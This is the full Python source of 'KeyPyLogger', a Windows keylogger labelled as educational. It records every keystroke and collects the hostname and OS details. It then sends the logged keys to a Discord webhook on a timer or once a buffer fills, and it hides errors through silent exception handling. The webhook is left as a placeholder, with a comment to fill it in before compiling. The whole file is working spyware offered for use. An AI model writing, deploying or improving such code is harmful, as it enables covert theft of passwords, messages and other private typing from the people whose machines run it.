#!/usr/bin/env python3
"""
KeyPyLogger - Windows Version
Educational keylogger for authorized security testing
"""

import os
import sys
import platform
import threading
import time
from datetime import datetime, timezone
from pynput import keyboard
import requests
import json

# ============================================================================
# CONFIGURATION - EDIT THESE VALUES BEFORE USE/COMPILING
# ============================================================================
WEBHOOK_URL = "YOUR_DISCORD_WEBHOOK_URL_HERE"
SEND_INTERVAL = 60  # Send logs every 60 seconds
MAX_BUFFER_SIZE = 1000  # Maximum characters before forcing send
# ============================================================================


class KeyLogger:
    def __init__(self, webhook_url, send_interval=60):
        """Initialize the keylogger"""
        self.webhook_url = webhook_url
        self.send_interval = send_interval
        self.log_buffer = []
        self.running = False
        self.system_info = self._get_system_info()

    def _get_system_info(self):
        """Collect basic system information"""
        return {
            "hostname": platform.node(),
            "os": platform.system(),
            "os_version": platform.version(),
            "architecture": platform.machine(),
            "python_version": platform.python_version()
        }

    def _format_key(self, key):
        """Format key press for logging"""
        try:
            if hasattr(key, 'char') and key.char is not None:
                return key.char
            else:
                special_keys = {
                    keyboard.Key.space: ' ',
                    keyboard.Key.enter: '\n',
                    keyboard.Key.tab: '\t',
                    keyboard.Key.backspace: '[BACKSPACE]',
                    keyboard.Key.delete: '[DELETE]',
                    keyboard.Key.shift: '[SHIFT]',
                    keyboard.Key.shift_r: '[SHIFT]',
                    keyboard.Key.ctrl: '[CTRL]',
                    keyboard.Key.ctrl_r: '[CTRL]',
                    keyboard.Key.alt: '[ALT]',
                    keyboard.Key.alt_r: '[ALT]',
                    keyboard.Key.caps_lock: '[CAPS]',
                    keyboard.Key.esc: '[ESC]',
                    keyboard.Key.up: '[UP]',
                    keyboard.Key.down: '[DOWN]',
                    keyboard.Key.left: '[LEFT]',
                    keyboard.Key.right: '[RIGHT]',
                }
                return special_keys.get(key, f'[{str(key).replace("Key.", "")}]')
        except Exception as e:
            return f'[ERROR:{str(e)}]'

    def _on_press(self, key):
        """Callback for key press events"""
        try:
            formatted_key = self._format_key(key)
            self.log_buffer.append(formatted_key)

            if len(''.join(self.log_buffer)) >= MAX_BUFFER_SIZE:
                self._send_logs()

        except Exception as e:
            pass  # Silent fail in production

    def _send_logs(self):
        """Send accumulated logs to Discord webhook"""
        if not self.log_buffer:
            return

        try:
            log_content = ''.join(self.log_buffer)

            if not log_content.strip():
                self.log_buffer = []
                return

            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

            embed = {
                "title": f"🔑 Keylog Report - {self.system_info['hostname']}",
                "description": f"```\n{log_content[:4000]}\n```",
                "color": 3447003,
                "fields": [
                    {
                        "name": "System",
                        "value": f"{self.system_info['os']} {self.system_info['architecture']}",
                        "inline": True
                    },
                    {
                        "name": "Timestamp",
                        "value": timestamp,
                        "inline": True
                    },
                    {
                        "name": "Buffer Size",
                        "value": f"{len(log_content)} characters",
                        "inline": True
                    }
                ],
                "footer": {
                    "text": "KeyPyLogger - Educational Purpose Only"
                }
            }

            payload = {
                "username": "KeyPyLogger",
                "embeds": [embed]
            }

            response = requests.post(
                self.webhook_url,
                json=payload,
                timeout=10
            )

            if response.status_code == 204:
                self.log_buffer = []

        except Exception as e:
            pass  # Silent fail in production

    def _periodic_send(self):
        """Periodically send logs at specified interval"""
        while self.running:
            time.sleep(self.send_interval)
            if self.running:
                self._send_logs()

    def start(self):
        """Start the keylogger"""
        self._send_initial_info()

        self.running = True
        send_thread = threading.Thread(target=self._periodic_send, daemon=True)
        send_thread.start()

        try:
            with keyboard.Listener(on_press=self._on_press) as listener:
                listener.join()
        except KeyboardInterrupt:
            self.stop()

    def stop(self):
        """Stop the keylogger and send remaining logs"""
        self.running = False
        self._send_logs()

    def _send_initial_info(self):
        """Send initial system information"""
        try:
            embed = {
                "title": "🚀 KeyPyLogger Started",
                "color": 5763719,
                "fields": [
                    {"name": "Hostname", "value": self.system_info['hostname'], "inline": True},
                    {"name": "OS", "value": self.system_info['os'], "inline": True},
                    {"name": "Architecture", "value": self.system_info['architecture'], "inline": True},
                    {"name": "OS Version", "value": self.system_info['os_version'][:100], "inline": False},
                    {"name": "Python Version", "value": self.system_info['python_version'], "inline": True},
                ],
                "timestamp": datetime.now(timezone.utc).isoformat(),
                "footer": {"text": "KeyPyLogger - Educational Purpose Only"}
            }

            payload = {"username": "KeyPyLogger", "embeds": [embed]}
            requests.post(self.webhook_url, json=payload, timeout=10)

        except Exception as e:
            pass  # Silent fail


def main():
    """Main entry point"""
    # Validate webhook
    if not WEBHOOK_URL or "discord.com/api/webhooks" not in WEBHOOK_URL:
        print("[!] ERROR: Invalid webhook URL!")
        print("[!] Please edit the WEBHOOK_URL in this script")
        sys.exit(1)

    # Create and start keylogger
    logger = KeyLogger(WEBHOOK_URL, SEND_INTERVAL)

    try:
        logger.start()
    except KeyboardInterrupt:
        logger.stop()
    except Exception as e:
        logger.stop()


if __name__ == "__main__":
    main()
